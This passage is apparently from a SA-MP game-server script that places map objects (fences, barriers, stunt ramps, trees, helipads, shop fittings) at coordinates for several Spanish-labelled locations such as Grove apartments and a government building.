	CreateDynamicObject(1251,1761.69995117,-2072.30004883,12.50000000,358.99475098,0.00000000,359.99450684); //object(smashbar) (6)
	CreateDynamicObject(1251,1754.69995117,-2072.19995117,12.50000000,358.99475098,0.00000000,359.99450684); //object(smashbar) (7)
	CreateDynamicObject(1251,1747.80004883,-2072.10009766,12.50000000,358.99475098,0.00000000,359.99450684); //object(smashbar) (8)
	CreateDynamicObject(1251,1740.69995117,-2072.19995117,12.50000000,358.99475098,0.00000000,359.99450684); //object(smashbar) (9)
	CreateDynamicObject(984,1806.59997559,-2077.80004883,16.50000000,0.00000000,0.00000000,270.00000000); //object(fenceshit2) (1)
	CreateDynamicObject(984,1793.80004883,-2077.80004883,16.50000000,0.00000000,0.00000000,269.99450684); //object(fenceshit2) (2)
	CreateDynamicObject(984,1781.00000000,-2077.80004883,16.50000000,0.00000000,0.00000000,269.99450684); //object(fenceshit2) (3)
	CreateDynamicObject(984,1768.19995117,-2077.80004883,16.50000000,0.00000000,0.00000000,269.99450684); //object(fenceshit2) (4)
	CreateDynamicObject(984,1755.40002441,-2077.80004883,16.50000000,0.00000000,0.00000000,269.99450684); //object(fenceshit2) (5)
	CreateDynamicObject(984,1742.59960938,-2077.69921875,16.50000000,0.00000000,0.00000000,269.98901367); //object(fenceshit2) (6)
	CreateDynamicObject(984,1729.79980469,-2077.69921875,16.50000000,0.00000000,0.00000000,269.98901367); //object(fenceshit2) (7)
	CreateDynamicObject(984,1806.50000000,-2019.30004883,16.50000000,0.00000000,0.00000000,269.99450684); //object(fenceshit2) (8)
	CreateDynamicObject(984,1793.69995117,-2019.30004883,16.50000000,0.00000000,0.00000000,269.99450684); //object(fenceshit2) (9)
	CreateDynamicObject(984,1791.00000000,-2019.30004883,16.50000000,0.00000000,0.00000000,269.99450684); //object(fenceshit2) (10)
	CreateDynamicObject(984,1812.90002441,-2025.69995117,16.50000000,0.00000000,0.00000000,359.99450684); //object(fenceshit2) (11)
	CreateDynamicObject(984,1812.90002441,-2038.50000000,16.50000000,0.00000000,0.00000000,359.99450684); //object(fenceshit2) (12)
	CreateDynamicObject(984,1812.90002441,-2051.19995117,16.50000000,0.00000000,0.00000000,359.99450684); //object(fenceshit2) (13)
	CreateDynamicObject(984,1812.90002441,-2060.80004883,16.50000000,0.00000000,0.00000000,359.99450684); //object(fenceshit2) (14)
	CreateDynamicObject(1686,1783.19995117,-2058.39990234,12.50000000,0.00000000,0.00000000,0.00000000); //object(petrolpumpnew) (1)
	CreateDynamicObject(1686,1789.50000000,-2058.39990234,12.50000000,0.00000000,0.00000000,0.00000000); //object(petrolpumpnew) (2)
	CreateDynamicObject(984,1717.00000000,-2077.69995117,16.50000000,0.00000000,0.00000000,269.98901367); //object(fenceshit2) (7)
	CreateDynamicObject(984,1704.19995117,-2077.69995117,16.50000000,0.00000000,0.00000000,269.98901367); //object(fenceshit2) (7)
	CreateDynamicObject(984,1691.40002441,-2077.69995117,16.50000000,0.00000000,0.00000000,269.98901367); //object(fenceshit2) (7)
	CreateDynamicObject(5153,1714.09997559,-2069.19995117,15.00000000,0.00000000,40.00000000,0.00000000); //object(stuntramp7_las2) (5)
	CreateDynamicObject(5153,1722.40002441,-2069.19995117,12.89999962,0.00000000,35.99572754,1.25000000); //object(stuntramp7_las2) (6)
	CreateDynamicObject(5153,1718.19995117,-2069.19995117,13.89999962,0.00000000,37.99121094,0.99694824); //object(stuntramp7_las2) (7)
	CreateDynamicObject(5153,1710.00000000,-2069.19995117,16.29999924,0.00000000,43.99121094,1.24694824); //object(stuntramp7_las2) (8)
	CreateDynamicObject(5153,1705.90002441,-2069.19995117,17.79999924,0.00000000,43.98925781,1.24145508); //object(stuntramp7_las2) (9)
	CreateDynamicObject(5153,1703.30004883,-2069.19995117,18.70000076,0.00000000,41.98925781,1.24145508); //object(stuntramp7_las2) (10)
	CreateDynamicObject(5153,1699.19995117,-2069.19995117,19.39999962,0.00000000,23.98422241,359.74145508); //object(stuntramp7_las2) (11)
	CreateDynamicObject(5153,1722.40002441,-2071.19995117,12.89999962,0.00000000,35.99121094,1.24694824); //object(stuntramp7_las2) (12)
	CreateDynamicObject(5153,1718.19995117,-2071.19995117,13.89999962,0.00000000,37.99072266,0.99426270); //object(stuntramp7_las2) (13)
	CreateDynamicObject(5153,1714.09997559,-2071.19995117,15.00000000,0.00000000,39.99572754,0.00000000); //object(stuntramp7_las2) (14)
	CreateDynamicObject(5153,1710.00000000,-2071.19995117,16.39999962,0.00000000,43.98925781,1.24145508); //object(stuntramp7_las2) (15)
	CreateDynamicObject(5153,1705.90002441,-2071.30004883,17.89999962,1.43881226,44.00668335,1.85211182); //object(stuntramp7_las2) (16)
	CreateDynamicObject(5153,1703.40002441,-2071.39990234,18.70000076,0.00000000,41.98425293,1.24145508); //object(stuntramp7_las2) (17)
	CreateDynamicObject(5153,1699.19995117,-2071.39990234,19.39999962,0.00000000,23.98315430,359.73632812); //object(stuntramp7_las2) (18)
	CreateDynamicObject(5153,1722.40002441,-2073.10009766,12.89999962,0.00000000,35.99121094,1.24694824); //object(stuntramp7_las2) (19)
	CreateDynamicObject(5153,1718.30004883,-2073.19995117,13.89999962,0.00000000,37.99072266,0.99426270); //object(stuntramp7_las2) (20)
	CreateDynamicObject(5153,1714.19995117,-2073.19995117,15.00000000,0.00000000,39.99572754,0.00000000); //object(stuntramp7_las2) (21)
	CreateDynamicObject(5153,1710.00000000,-2073.19995117,16.39999962,0.00000000,43.98925781,1.24145508); //object(stuntramp7_las2) (22)
	CreateDynamicObject(5153,1705.90002441,-2073.30004883,17.89999962,1.43371582,44.00573730,1.85119629); //object(stuntramp7_las2) (23)
	CreateDynamicObject(5153,1703.50000000,-2073.39990234,18.70000076,0.00000000,41.98425293,1.24145508); //object(stuntramp7_las2) (24)
	CreateDynamicObject(5153,1699.30004883,-2073.39990234,19.39999962,0.00000000,23.98315430,359.73632812); //object(stuntramp7_las2) (25)
	CreateDynamicObject(982,1696.69995117,-2055.60009766,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit) (1)
	CreateDynamicObject(982,1696.69995117,-2029.90002441,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit) (2)
	CreateDynamicObject(982,1696.69995117,-2020.30004883,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit) (3)
	CreateDynamicObject(982,1709.59997559,-2007.50000000,20.20000076,0.00000000,0.00000000,90.25000000); //object(fenceshit) (4)
	CreateDynamicObject(982,1735.19995117,-2007.40002441,20.20000076,0.00000000,0.00000000,89.99719238); //object(fenceshit) (5)
	CreateDynamicObject(982,1760.80004883,-2007.40002441,20.20000076,0.00000000,0.00000000,89.99450684); //object(fenceshit) (6)
	CreateDynamicObject(982,1715.90002441,-2067.50000000,20.20000076,0.00000000,0.00000000,90.24719238); //object(fenceshit) (7)
	CreateDynamicObject(982,1742.50000000,-2053.19995117,20.20000076,0.00000000,0.00000000,90.24719238); //object(fenceshit) (8)
	CreateDynamicObject(982,1763.19995117,-2040.30004883,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit) (9)
	CreateDynamicObject(983,1780.50000000,-2010.69995117,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (1)
	CreateDynamicObject(983,1780.50000000,-2015.50000000,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (2)
	CreateDynamicObject(983,1776.80004883,-2007.40002441,20.20000076,0.00000000,0.00000000,90.00000000); //object(fenceshit3) (3)
	CreateDynamicObject(983,1763.19995117,-2024.30004883,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (4)
	CreateDynamicObject(983,1777.19995117,-2018.80004883,20.20000076,0.00000000,0.00000000,90.00000000); //object(fenceshit3) (5)
	CreateDynamicObject(983,1770.80004883,-2018.80004883,20.20000076,0.00000000,0.00000000,90.00000000); //object(fenceshit3) (6)
	CreateDynamicObject(983,1766.00000000,-2018.80004883,20.20000076,0.00000000,0.00000000,90.00000000); //object(fenceshit3) (7)
	CreateDynamicObject(983,1758.59997559,-2053.10009766,20.20000076,0.00000000,0.00000000,90.00000000); //object(fenceshit3) (8)
	CreateDynamicObject(983,1729.59997559,-2056.50000000,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (9)
	CreateDynamicObject(983,1729.59997559,-2062.89990234,20.20000076,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (10)
	CreateDynamicObject(1251,1762.40002441,-2056.50000000,12.50000000,358.99475098,0.00000000,179.99450684); //object(smashbar) (4)
	CreateDynamicObject(8558,1717.59997559,-2011.00000000,21.10000038,0.00000000,0.00000000,359.99450684); //object(vgshseing28) (1)
	CreateDynamicObject(8558,1759.69995117,-2010.90002441,21.10000038,0.00000000,0.00000000,359.99450684); //object(vgshseing28) (1)
	CreateDynamicObject(8558,1744.00000000,-2049.89990234,21.10000038,0.00000000,0.00000000,180.49450684); //object(vgshseing28) (1)
	CreateDynamicObject(8558,1743.19995117,-2028.00000000,21.10000038,0.00000000,0.00000000,180.49438477); //object(vgshseing28) (1)
	CreateDynamicObject(8558,1743.30004883,-2033.19995117,21.10000038,0.00000000,0.00000000,0.49438477); //object(vgshseing28) (1)
	CreateDynamicObject(994,1697.19995117,-2068.00000000,19.60000038,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier2) (1)
	CreateDynamicObject(997,1697.59997559,-2074.39990234,19.50000000,0.00000000,0.00000000,0.00000000); //object(lhouse_barrier3) (4)
	CreateDynamicObject(9618,1694.79980469,-2062.59960938,14.30000019,0.00000000,0.00000000,0.00000000); //object(scaff1_sfw) (1)
	CreateDynamicObject(18014,1728.59997559,-2030.80004883,20.00000000,0.00000000,0.00000000,270.00000000); //object(int_rest_veg03) (1)
	CreateDynamicObject(18014,1736.59997559,-2030.69995117,20.00000000,0.00000000,0.00000000,269.25000000); //object(int_rest_veg03) (2)
	CreateDynamicObject(18014,1743.40002441,-2030.59997559,20.00000000,0.00000000,0.00000000,270.00000000); //object(int_rest_veg03) (3)
	CreateDynamicObject(18014,1750.09997559,-2030.59997559,20.00000000,0.00000000,0.00000000,270.00000000); //object(int_rest_veg03) (4)
	CreateDynamicObject(18014,1757.50000000,-2030.50000000,20.00000000,0.00000000,0.00000000,270.00000000); //object(int_rest_veg03) (5)
	CreateDynamicObject(1288,1778.09997559,-2031.30004883,13.10000038,0.00000000,0.00000000,126.00000000); //object(newstandnew2) (1)
	CreateDynamicObject(1288,1770.50000000,-2031.30004883,13.10000038,0.00000000,0.00000000,125.99670410); //object(newstandnew2) (2)
	CreateDynamicObject(1288,1770.30004883,-2034.50000000,12.69999981,0.00000000,0.00000000,83.99670410); //object(newstandnew2) (3)
	CreateDynamicObject(1288,1770.30004883,-2035.09997559,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (4)
	CreateDynamicObject(1288,1770.30004883,-2036.00000000,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (5)
	CreateDynamicObject(1288,1777.19995117,-2034.30004883,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (6)
	CreateDynamicObject(1288,1777.40002441,-2035.09997559,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (7)
	CreateDynamicObject(1288,1778.00000000,-2036.09997559,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (8)
	CreateDynamicObject(1288,1778.00000000,-2035.30004883,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (9)
	CreateDynamicObject(1288,1778.00000000,-2034.50000000,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (10)
	CreateDynamicObject(1288,1785.09997559,-2035.30004883,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (11)
	CreateDynamicObject(1288,1784.90002441,-2034.40002441,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (12)
	CreateDynamicObject(1288,1781.50000000,-2026.40002441,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (13)
	CreateDynamicObject(1288,1780.80004883,-2026.40002441,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (14)
	CreateDynamicObject(1288,1780.09997559,-2026.40002441,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (15)
	CreateDynamicObject(1288,1775.69995117,-2026.50000000,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (16)
	CreateDynamicObject(1288,1773.80004883,-2026.30004883,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (17)
	CreateDynamicObject(1288,1773.09997559,-2026.30004883,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (18)
	CreateDynamicObject(1288,1772.40002441,-2026.30004883,12.69999981,0.00000000,0.00000000,83.99597168); //object(newstandnew2) (19)
	CreateDynamicObject(1463,1769.90002441,-2048.00000000,12.89999962,0.00000000,0.00000000,0.00000000); //object(dyn_woodpile2) (1)
	CreateDynamicObject(1463,1769.69995117,-2049.50000000,12.89999962,0.00000000,0.00000000,0.00000000); //object(dyn_woodpile2) (2)
	CreateDynamicObject(1463,1769.59997559,-2051.10009766,12.89999962,0.00000000,0.00000000,0.00000000); //object(dyn_woodpile2) (3)
	CreateDynamicObject(1463,1769.59997559,-2051.00000000,13.19999981,0.00000000,0.00000000,0.00000000); //object(dyn_woodpile2) (4)
	CreateDynamicObject(1463,1769.69995117,-2049.89990234,13.19999981,0.00000000,0.00000000,0.00000000); //object(dyn_woodpile2) (5)
	CreateDynamicObject(1463,1769.80004883,-2048.19995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(dyn_woodpile2) (6)

	//                           CASAS (DEPTOS GROVE)               //
	CreateDynamicObject(982,2190.47631836,-1798.11914062,13.23664379,0.00000000,0.00000000,0.00000000); //object(fenceshit) (1)
	CreateDynamicObject(984,2162.133906,-1790.68994141,13.15733051,0.00000000,0.00000000,270.00000000); //object(fenceshit2) (1)
	CreateDynamicObject(983,2171.71630859,-1790.70153809,13.20391560,0.00000000,0.00000000,270.00000000); //object(fenceshit3) (1)
	CreateDynamicObject(966,2188.93115234,-1776.95007324,12.37317085,0.00000000,0.00000000,358.00000000); //object(bar_gatebar01) (1)
	CreateDynamicObject(991,2192.51074219,-1776.83593750,13.56833649,0.00000000,0.00000000,0.00000000); //object(bar_barriergate1) (1)
	CreateDynamicObject(991,21.63134766,-1776.73754883,13.56833649,0.00000000,0.00000000,0.00000000); //object(bar_barriergate1) (2)
	CreateDynamicObject(1251,2175.40209961,-1792.94201660,12.41358185,0.00000000,0.00000000,0.00000000); //object(smashbar) (1)
	CreateDynamicObject(1251,2172.01123047,-1793.18725586,12.41358185,0.00000000,0.00000000,0.00000000); //object(smashbar) (2)
	CreateDynamicObject(1251,2168.81542969,-1793.34594727,12.41358185,0.00000000,0.00000000,0.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,2165.41943359,-1793.49194336,12.41358185,0.00000000,0.00000000,0.00000000); //object(smashbar) (4)
	CreateDynamicObject(1251,2162.29980469,-1793.67114258,12.41358185,0.00000000,0.00000000,0.00000000); //object(smashbar) (5)
	CreateDynamicObject(1251,2159.02880859,-1793.81005859,12.41358185,0.00000000,0.00000000,0.00000000); //object(smashbar) (6)
	CreateDynamicObject(1251,2155.320312,-1793.97192383,12.41358185,0.00000000,0.00000000,0.00000000); //object(smashbar) (7)
	CreateDynamicObject(1251,2188.39184570,-16.13183594,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (8)
	CreateDynamicObject(1251,2188.08935547,-19.65161133,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (9)
	CreateDynamicObject(1251,2188.16308594,-1792.70166016,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (10)
	CreateDynamicObject(1251,2188.16015625,-1795.70556641,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (11)
	CreateDynamicObject(1251,2188.05273438,-1798.61621094,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (12)
	CreateDynamicObject(1251,2188.08691406,-1801.86865234,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (13)
	CreateDynamicObject(1251,2188.07543945,-1804.697598,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (14)
	CreateDynamicObject(1251,2188.19921875,-1807.74511719,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (15)
	CreateDynamicObject(1251,2188.23510742,-1810.52185059,12.42907143,0.00000000,0.00000000,90.00000000); //object(smashbar) (16)
	CreateDynamicObject(982,2168.18969727,-1810.91308594,13.23664379,0.00000000,0.00000000,270.00000000); //object(fenceshit) (3)
	CreateDynamicObject(1251,2181.25219727,-1808.59960938,12.42823982,0.00000000,0.00000000,0.00000000); //object(smashbar) (17)
	CreateDynamicObject(1251,21.17553711,-1808.52856445,12.42823982,0.00000000,0.00000000,0.00000000); //object(smashbar) (18)
	CreateDynamicObject(1251,2175.03881836,-1808.60229492,12.42823982,0.00000000,0.00000000,0.00000000); //object(smashbar) (19)
	CreateDynamicObject(1251,2172.16479492,-1808.49462891,12.42823982,0.00000000,0.00000000,0.00000000); //object(smashbar) (20)
	CreateDynamicObject(1251,2169.31591797,-1808.38867188,12.42823982,0.00000000,0.00000000,359.00000000); //object(smashbar) (21)
	CreateDynamicObject(1251,2166.43164062,-1808.43151855,12.42823982,0.00000000,0.00000000,358.99475098); //object(smashbar) (22)
	CreateDynamicObject(1251,2163.47363281,-1808.46728516,12.42823982,0.00000000,0.00000000,358.99475098); //object(smashbar) (23)
	CreateDynamicObject(1251,2160.45874023,-1808.59973145,12.42823982,0.00000000,0.00000000,358.99475098); //object(smashbar) (24)
	CreateDynamicObject(1251,2157.27514648,-1808.62084961,12.42823982,0.00000000,0.00000000,358.99475098); //object(smashbar) (25)

	//                              GOBIERNO INT.                   //
	CreateDynamicObject_e(13614,373.09960938,164.59960938,1009.29998779,0.00000000,0.00000000,270.00000000); //object(thebowl12) (1)
	CreateDynamicObject_e(2825,363.39999390,204.10000610,1008.20001221,0.00000000,0.00000000,0.00000000); //object(gb_novels03) (1)
	CreateDynamicObject_e(13614,370.89999390,195.10000610,1009.29998779,0.00000000,0.00000000,0.00000000); //object(thebowl12) (1)
	CreateDynamicObject_e(13614,346.60000610,155.39999390,1015.09997559,0.00000000,0.00000000,270.00000000); //object(thebowl12) (1)
	CreateDynamicObject_e(2398,348.00000000,166.89999390,1014.90002441,0.00000000,0.00000000,0.00000000); //object(cj_trackies_light) (1)
	CreateDynamicObject_e(2399,347.20001221,166.89999390,1014.90002441,0.00000000,0.00000000,0.00000000); //object(cj_4_s_sweater_2) (1)
	CreateDynamicObject_e(2396,346.60000610,166.89999390,1014.90002441,0.00000000,0.00000000,0.00000000); //object(cj_4_s_sweater) (1)
	CreateDynamicObject_e(2391,345.89999390,166.89999390,1014.90002441,0.00000000,0.00000000,0.00000000); //object(cj_jean_cream) (1)
	CreateDynamicObject_e(2390,348.70001221,166.89999390,1014.90002441,0.00000000,0.00000000,0.00000000); //object(cj_4way_clothes) (1)
	CreateDynamicObject_e(2389,345.20001221,166.89999390,1014.90002441,0.00000000,0.00000000,0.00000000); //object(cj_4_sweaters) (1)
	CreateDynamicObject_e(2378,349.50000000,166.89999390,1014.90002441,0.00000000,0.00000000,0.00000000); //object(cj_jean_light) (1)
	CreateDynamicObject_e(2382,349.50000000,166.10000610,1013.90002441,0.00000000,0.00000000,0.00000000); //object(cj_8_jeans_light) (1)
	CreateDynamicObject_e(2382,349.50000000,165.19999695,1013.90002441,0.00000000,0.00000000,0.00000000); //object(cj_8_jeans_light) (2)
	CreateDynamicObject_e(2372,349.70001221,165.19999695,1013.20001221,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (1)
	CreateDynamicObject_e(2372,348.39999390,165.10000610,1013.20001221,0.00000000,0.00000000,0.00000000); //object(clothes_rail2) (2)
	CreateDynamicObject_e(2394,348.20001221,165.60000610,1013.90002441,0.00000000,0.00000000,90.00000000); //object(cj_clothes_step_1) (1)
	CreateDynamicObject_e(18105,345.50000000,154.10000610,1015.00000000,0.00000000,0.00000000,270.00000000); //object(cj_ammun5_extra) (1)

	//                              GOBIERNO EXT.                   //
	CreateDynamicObject(4639,1434.69995117,-1883.19995117,14.30000019,0.00000000,0.00000000,0.00000000); //object(paypark_lan02) (1)
	CreateDynamicObject(966,1430.90002441,-1883.19995117,12.39999962,0.00000000,0.00000000,0.00000000); //object(bar_gatebar01) (1)
	CreateDynamicObject(997,1420.50000000,-1883.00000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(lhouse_barrier3) (1)
	CreateDynamicObject(997,1417.30004883,-1883.00000000,12.60000038,0.00000000,0.00000000,0.00000000); //object(lhouse_barrier3) (2)
	CreateDynamicObject(997,1431.19995117,-1883.19995117,12.60000038,0.00000000,0.00000000,0.00000000); //object(lhouse_barrier3) (3)
	CreateDynamicObject(1597,1426.30004883,-1906.19995117,15.39999962,0.00000000,0.00000000,0.00000000); //object(cntrlrsac1) (1)
	CreateDynamicObject(3511,1389.19995117,-1920.00000000,17.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (1)
	CreateDynamicObject(3511,1388.40002441,-1934.59997559,17.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (2)
	CreateDynamicObject(3511,1343.30004883,-1926.69995117,20.29999924,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (3)
	CreateDynamicObject(3511,1345.90002441,-1911.90002441,20.29999924,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (4)
	CreateDynamicObject(3511,1304.69995117,-1903.09997559,23.50000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (5)
	CreateDynamicObject(3511,1302.09997559,-1917.80004883,23.50000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (6)
	CreateDynamicObject(3511,1265.19995117,-1915.40002441,28.29999924,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (7)
	CreateDynamicObject(3511,1245.50000000,-1911.30004883,29.10000038,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (8)
	CreateDynamicObject(3511,1253.80004883,-1944.30004883,29.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (9)
	CreateDynamicObject(3511,1265.19995117,-1933.59997559,29.39999962,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (10)
	CreateDynamicObject(3511,1305.19995117,-1947.80004883,28.20000076,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (11)
	CreateDynamicObject(3511,1301.30004883,-1962.50000000,28.20000076,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (12)
	CreateDynamicObject(3511,1343.00000000,-1970.90002441,29.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (13)
	CreateDynamicObject(3511,1347.19995117,-1956.90002441,29.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (14)
	CreateDynamicObject(3511,1430.50000000,-1981.80004883,47.00000000,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (15)
	CreateDynamicObject(3511,1417.50000000,-1990.59997559,46.29999924,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (16)
	CreateDynamicObject(3511,1416.90002441,-2024.40002441,51.29999924,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (17)
	CreateDynamicObject(3511,1425.30004883,-2036.59997559,51.29999924,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (18)
	CreateDynamicObject(3511,1379.80004883,-2057.39990234,54.29999924,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (19)
	CreateDynamicObject(3511,1375.19995117,-2043.40002441,54.59999847,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (20)
	CreateDynamicObject(3511,1322.30004883,-2049.00000000,56.59999847,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (21)
	CreateDynamicObject(3511,1323.40002441,-2064.19995117,56.59999847,0.00000000,0.00000000,0.00000000); //object(vgsn_nitree_b01) (22)
	CreateDynamicObject(3749,1264.40002441,-2048.39990234,63.90000153,0.00000000,0.00000000,0.00000000); //object(clubgate01_lax) (1)
	CreateDynamicObject(987,1242.69995117,-2050.10009766,59.00000000,0.00000000,0.00000000,358.00000000); //object(elecfence_bar) (8)
	CreateDynamicObject(987,1243.19995117,-2038.19995117,58.29999924,0.00000000,0.00000000,267.99499512); //object(elecfence_bar) (9)
	CreateDynamicObject(987,1272.09997559,-2050.10009766,58.09999847,0.00000000,0.00000000,357.99499512); //object(elecfence_bar) (11)
	CreateDynamicObject(987,1284.09997559,-2050.60009766,57.79999924,0.00000000,0.00000000,87.99499512); //object(elecfence_bar) (12)
	CreateDynamicObject(987,1284.50000000,-2038.59997559,57.70000076,0.00000000,0.00000000,89.98950195); //object(elecfence_bar) (13)
	CreateDynamicObject(987,1284.59997559,-2026.59997559,57.70000076,0.00000000,0.00000000,89.98901367); //object(elecfence_bar) (14)
	CreateDynamicObject(987,1284.59997559,-2014.59997559,57.70000076,0.00000000,0.00000000,89.98901367); //object(elecfence_bar) (15)
	CreateDynamicObject(987,1285.09997559,-2002.90002441,57.50000000,0.00000000,0.00000000,179.98901367); //object(elecfence_bar) (16)
	CreateDynamicObject(987,1273.09997559,-2002.90002441,58.00000000,0.00000000,0.00000000,179.98352051); //object(elecfence_bar) (17)
	CreateDynamicObject(987,1261.09997559,-2002.90002441,58.29999924,0.00000000,0.00000000,179.98352051); //object(elecfence_bar) (18)
	CreateDynamicObject(987,1254.59997559,-2002.90002441,58.29999924,0.00000000,0.00000000,179.98352051); //object(elecfence_bar) (19)
	CreateDynamicObject(987,1242.59997559,-2002.90002441,58.29999924,0.00000000,0.00000000,269.98352051); //object(elecfence_bar) (20)
	CreateDynamicObject(987,1242.59997559,-2014.90002441,58.29999924,0.00000000,0.00000000,269.97802734); //object(elecfence_bar) (21)
	CreateDynamicObject(987,1243.09997559,-2026.30004883,58.29999924,0.00000000,0.00000000,269.97802734); //object(elecfence_bar) (22)
	CreateDynamicObject(8209,1162.80004883,-2003.00000000,68.90000153,0.00000000,0.00000000,179.99450684); //object(vgsselecfence11) (1)
	CreateDynamicObject(8209,1163.19995117,-2070.60009766,68.40000153,0.00000000,0.00000000,359.98901367); //object(vgsselecfence11) (2)
	CreateDynamicObject(987,1212.30004883,-2015.30004883,68.00000000,0.00000000,0.00000000,90.00000000); //object(elecfence_bar) (2)
	CreateDynamicObject(987,1212.40002441,-2027.40002441,68.00000000,0.00000000,0.00000000,90.00000000); //object(elecfence_bar) (3)
	CreateDynamicObject(3749,1211.19995117,-2037.50000000,73.50000000,0.00000000,0.00000000,90.00000000); //object(clubgate01_lax) (2)
	CreateDynamicObject(987,1212.80004883,-2070.80004883,68.00000000,0.00000000,0.00000000,90.00000000); //object(elecfence_bar) (5)
	CreateDynamicObject(987,1212.80004883,-2058.80004883,68.00000000,0.00000000,0.00000000,90.00000000); //object(elecfence_bar) (6)
	CreateDynamicObject(8210,1109.30004883,-2038.19995117,73.40000153,0.00000000,0.00000000,270.00000000); //object(vgsselecfence12) (2)
	CreateDynamicObject(987,1109.00000000,-2065.89990234,72.90000153,0.00000000,0.00000000,330.00000000); //object(elecfence_bar) (7)
	CreateDynamicObject(987,1118.19995117,-2003.00000000,72.90000153,0.00000000,0.00000000,219.99633789); //object(elecfence_bar) (10)
	CreateDynamicObject(3934,1153.09997559,-2055.19995117,68.00000000,0.00000000,0.00000000,0.00000000); //object(helipad01) (1)
	CreateDynamicObject(3934,1196.90002441,-2054.39990234,68.00000000,0.00000000,0.00000000,0.00000000); //object(helipad01) (2)
	CreateDynamicObject(3934,1197.00000000,-2019.30004883,68.00000000,0.00000000,0.00000000,0.00000000); //object(helipad01) (3)
	CreateDynamicObject(3934,1153.40002441,-2019.50000000,68.00000000,0.00000000,0.00000000,0.00000000); //object(helipad01) (4)
	CreateDynamicObject(3458,1246.69995117,-2026.19995117,60.29999924,0.00000000,0.00000000,270.00000000); //object(vgncarshade1) (1)
	CreateDynamicObject(3458,1277.00000000,-2026.00000000,59.40000153,0.00000000,0.00000000,90.00000000); //object(vgncarshade1) (2)
	CreateDynamicObject(3439,1217.30004883,-2042.30004883,70.40000153,0.00000000,0.00000000,0.00000000); //object(aprtree01_lvs) (1)
	CreateDynamicObject(3439,1217.30004883,-2031.80004883,70.40000153,0.00000000,0.00000000,0.00000000); //object(aprtree01_lvs) (2)
	CreateDynamicObject(3660,1260.59997559,-2006.19995117,60.90000153,0.00000000,0.00000000,180.00000000); //object(lasairfbed_las) (1)

	//                              LUGARES DE TECNOLOGÍA                   //
	CreateDynamicObject_e(18459,-1709.09960938,1884.69921875,1069.50000000,0.00000000,0.00000000,0.00000000); //object(cs_detrok07) (1)
	CreateDynamicObject_e(18459,-1709.09960938,1894.29980469,1069.50000000,0.00000000,0.00000000,0.00000000); //object(cs_detrok07) (2)
	CreateDynamicObject_e(18459,-1709.09960938,1903.89941406,1069.50000000,0.00000000,0.00000000,0.00000000); //object(cs_detrok07) (3)
	CreateDynamicObject_e(18459,-1704.30004883,1879.80004883,1069.50000000,0.00000000,0.00000000,270.00000000); //object(cs_detrok07) (4)
	CreateDynamicObject_e(18459,-1694.69995117,1879.80004883,1069.50000000,0.00000000,0.00000000,270.00000000); //object(cs_detrok07) (5)
	CreateDynamicObject_e(18459,-1689.79980469,1884.59960938,1069.50000000,0.00000000,0.00000000,0.00000000); //object(cs_detrok07) (6)
